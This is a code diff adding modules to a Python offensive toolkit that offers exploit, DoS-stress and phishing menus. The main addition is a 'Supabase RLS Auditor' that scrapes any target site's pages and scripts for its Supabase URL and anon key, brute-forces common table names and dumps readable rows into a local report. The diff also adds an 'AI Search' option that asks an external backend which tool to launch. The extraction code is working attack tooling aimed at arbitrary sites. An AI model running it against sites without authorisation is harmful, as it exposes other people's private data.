@@ -20,7 +20,7 @@ import random
 import string
 import subprocess
 import shutil
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urljoin
 
 try:
     import requests
@@ -5936,6 +5936,190 @@ def wp_rest_api_exploit():
     print_row("API routes", str(len(routes)))
 
 
+# ─── 61. Supabase RLS Auditor ─────────────────────────────────────────────────
+
+SUPABASE_COMMON_TABLES = [
+    'users', 'profiles', 'todos', 'posts', 'products',
+    'orders', 'settings', 'admin', 'customers', 'messages',
+    'comments', 'accounts', 'sessions', 'payments', 'items',
+    'categories', 'logs', 'notifications', 'tokens', 'files',
+]
+
+
+def _supabase_extract_config(url):
+    """Scrape target URL for Supabase project URL and anon key."""
+    headers = {'User-Agent': 'Mozilla/5.0 (Supabase-Security-Audit)'}
+    resp = requests.get(url, headers=headers, timeout=10)
+    content = resp.text
+
+    url_pattern = r"https://([a-z0-9-]+)\.supabase\.co"
+    key_pattern = r"eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+"
+
+    project_match = re.search(url_pattern, content)
+    key_matches = re.findall(key_pattern, content)
+
+    # If not found in HTML, search external JS files
+    if (not project_match or not key_matches) and BeautifulSoup:
+        soup = BeautifulSoup(content, 'html.parser')
+        scripts = soup.find_all('script', src=True)
+        for script in scripts:
+            if project_match and key_matches:
+                break
+            try:
+                js_url = urljoin(url, script['src'])
+                js_resp = requests.get(js_url, headers=headers, timeout=5)
+                if not project_match:
+                    project_match = re.search(url_pattern, js_resp.text)
+                if not key_matches:
+                    found = re.findall(key_pattern, js_resp.text)
+                    if found:
+                        key_matches.extend(found)
+            except Exception:
+                continue
+
+    project_url = project_match.group(0) if project_match else None
+    anon_key = key_matches[0] if key_matches else None
+    return project_url, anon_key
+
+
+def _supabase_test_rls(project_url, anon_key):
+    """Discover tables and test for RLS misconfigurations."""
+    headers = {
+        "apikey": anon_key,
+        "Authorization": f"Bearer {anon_key}",
+        "Content-Type": "application/json",
+    }
+    base_rest_url = f"{project_url}/rest/v1/"
+    tables = []
+
+    # Table discovery via OpenAPI schema
+    try:
+        schema_resp = requests.get(base_rest_url, headers=headers, timeout=5)
+        if schema_resp.status_code == 200:
+            definitions = schema_resp.json().get('definitions', {})
+            tables = list(definitions.keys())
+            print_ok(f"Schema found — {len(tables)} tables detected")
+        else:
+            print_warn("Schema hidden — falling back to common table brute-force")
+            tables = list(SUPABASE_COMMON_TABLES)
+    except Exception as e:
+        print_err(f"Connection error: {e}")
+        return [], 0, 0
+
+    # Data extraction
+    vulnerable = 0
+    safe = 0
+    results = []
+
+    for table in tables:
+        query_url = f"{base_rest_url}{table}?select=*&limit=5"
+        try:
+            r = requests.get(query_url, headers=headers, timeout=5)
+            if r.status_code == 200:
+                data = r.json()
+                if isinstance(data, list) and len(data) > 0:
+                    vulnerable += 1
+                    results.append((table, data))
+                    print(f"    {R}[VULN]{RST} {table} — RLS OFF — {len(data)} rows exposed")
+                    preview = json.dumps(data, indent=2, ensure_ascii=False)
+                    for line in preview.split('\n')[:6]:
+                        print(f"           {W}{line}{RST}")
+                    if len(preview.split('\n')) > 6:
+                        print(f"           {Y}... (truncated){RST}")
+                else:
+                    safe += 1
+                    print(f"    {G}[SAFE]{RST} {table}")
+            else:
+                safe += 1
+                print(f"    {W}[{r.status_code}]{RST}  {table}")
+        except Exception:
+            print(f"    {Y}[ERR]{RST}  {table}")
+
+    return results, vulnerable, safe
+
+
+def supabase_rls_auditor():
+    print_header("Supabase RLS Auditor")
+    if not exploit_disclaimer():
+        return
+
+    target = prompt("Target URL (website using Supabase)")
+    if not target:
+        return
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    # Phase 1: extract config
+    spinner("Scanning for Supabase credentials...", 1.5)
+    try:
+        project_url, anon_key = _supabase_extract_config(target)
+    except Exception as e:
+        print_err(f"Scraping error: {e}")
+        project_url, anon_key = None, None
+
+    if project_url:
+        print_ok(f"Project URL: {project_url}")
+    else:
+        print_warn("Project URL not found automatically")
+
+    if anon_key:
+        masked = anon_key[:15] + "..." + anon_key[-10:]
+        print_ok(f"Anon Key:    {masked}")
+    else:
+        print_warn("Anon key not found automatically")
+
+    # Manual fallback
+    if not project_url or not anon_key:
+        print(f"\n  {Y}Enter credentials manually (leave blank to abort):{RST}")
+        if not project_url:
+            project_url = prompt("Supabase Project URL (https://xxx.supabase.co)")
+        if not anon_key:
+            anon_key = prompt("Anon Key")
+        if not project_url or not anon_key:
+            print_err("Missing credentials — aborting")
+            return
+
+    # Phase 2: RLS vulnerability scan
+    print(f"\n  {Y}Testing RLS on tables...{RST}\n")
+    spinner("Connecting to REST endpoint...", 1.0)
+
+    results, vuln_count, safe_count = _supabase_test_rls(project_url, anon_key)
+    total = vuln_count + safe_count
+
+    # Summary
+    print(f"\n  {Y}{'═' * 50}{RST}")
+    print_row("Tables tested", str(total))
+    print_row("Vulnerable (RLS OFF)", str(vuln_count))
+    print_row("Safe", str(safe_count))
+
+    if vuln_count > 0:
+        print(f"\n  {R}WARNING: {vuln_count} table(s) with publicly readable data!{RST}")
+        print(f"  {Y}Recommendations:{RST}")
+        print(f"    {W}1. Enable RLS on all exposed tables{RST}")
+        print(f"    {W}2. Define granular access policies{RST}")
+        print(f"    {W}3. Remove anon key from frontend code{RST}")
+        print(f"    {W}4. Use service_role only server-side{RST}")
+
+        # Save report
+        report_file = "supabase_audit_report.txt"
+        try:
+            with open(report_file, "w", encoding="utf-8") as f:
+                f.write(f"SUPABASE RLS AUDIT REPORT\n")
+                f.write(f"Target: {target}\n")
+                f.write(f"Project: {project_url}\n")
+                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"{'=' * 50}\n\n")
+                for table, data in results:
+                    f.write(f"[VULNERABLE] {table}\n")
+                    f.write(json.dumps(data, indent=2, ensure_ascii=False))
+                    f.write(f"\n{'-' * 40}\n")
+            print_ok(f"Full report saved to {report_file}")
+        except Exception as e:
+            print_err(f"Could not save report: {e}")
+    else:
+        print(f"\n  {G}No RLS misconfigurations detected.{RST}")
+
+
 # ═══════════════════════════════════════════════════════════════════════════════
 #                     STRESS TESTING / DoS MODULES
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -8350,6 +8534,7 @@ EXPLOIT_ITEMS = [
     ("Insecure Cookie Checker", cookie_checker),
     ("CSRF Token Analyzer", csrf_analyzer),
     ("Prototype Pollution Scanner", prototype_pollution),
+    ("Supabase RLS Auditor", supabase_rls_auditor),
 ]
 
 STRESS_ITEMS = [
@@ -8379,6 +8564,55 @@ PHISHING_ITEMS = [
 ]
 
 MENU_ITEMS = RECON_ITEMS + EXPLOIT_ITEMS + STRESS_ITEMS + PHISHING_ITEMS
+
+
+AI_SEARCH_API = "https://argusbackend-psi.vercel.app"
+
+
+def ai_search():
+    query = input(f"\n  {Y}Search query:{RST} ").strip()
+    if not query:
+        print_err("Empty query")
+        return
+    try:
+        resp = requests.get(f"{AI_SEARCH_API}/search", params={"q": query}, timeout=30)
+        resp.raise_for_status()
+        data = resp.json()
+    except requests.ConnectionError:
+        print_err(f"Cannot connect to ARGUS API at {AI_SEARCH_API}")
+        print_err("Start it with: cd api && uvicorn main:app --reload")
+        return
+    except Exception as e:
+        print_err(f"API error: {e}")
+        return
+
+    results = data.get("results", [])
+    if not results:
+        print_warn("No tools found for this query.")
+        return
+
+    print(f"\n  {G}{'─' * 60}{RST}")
+    print(f"  {G}AI Search Results for:{RST} {W}{query}{RST}")
+    print(f"  {G}{'─' * 60}{RST}")
+    for r in results:
+        mid = r.get("menu_number", r.get("id", "?"))
+        print(f"\n  {C}[{mid}]{RST} {W}{r['name']}{RST} ({r['category']})")
+        print(f"      {r.get('description', '')}")
+        if r.get("relevance"):
+            print(f"      {Y}→ {r['relevance']}{RST}")
+    print(f"\n  {G}{'─' * 60}{RST}")
+
+    sel = input(f"\n  {Y}Launch tool number (or Enter to go back):{RST} ").strip()
+    if sel:
+        try:
+            idx = int(sel) - 1
+            if 0 <= idx < len(MENU_ITEMS):
+                name, func = MENU_ITEMS[idx]
+                func()
+            else:
+                print_err("Invalid tool number")
+        except ValueError:
+            print_err("Enter a valid number")
 
 
 def show_menu():
@@ -8416,6 +8650,8 @@ def show_menu():
     _section("PHISHING SIMULATION", PHISHING_ITEMS,
              len(RECON_ITEMS) + len(EXPLOIT_ITEMS) + len(STRESS_ITEMS) + 1, M)
     print(f"  {Y}╠{'═' * w}╣{RST}")
+    ai_txt = "AI Search — Find the best tool for your needs"
+    print(f"  {Y}║{RST}  {G} A.{RST} {W}{ai_txt:<{w - 6}}{Y}║{RST}")
     print(f"  {Y}║{RST}  {M} S.{RST} {W}{'Stealth Mode Config':<{w - 6}}{Y}║{RST}")
     print(f"  {Y}║{RST}  {R} 0.{RST} {W}{'Exit':<{w - 6}}{Y}║{RST}")
     print(f"  {Y}╚{'═' * w}╝{RST}")
@@ -8432,6 +8668,14 @@ def main():
         if choice == "0":
             print(f"\n  {R}Goodbye.{RST}\n")
             break
+
+        if choice.lower() == "a":
+            try:
+                ai_search()
+            except KeyboardInterrupt:
+                print(f"\n  {Y}Interrupted.{RST}")
+            pause()
+            continue
 
         if choice.lower() == "s":
             configure_stealth()
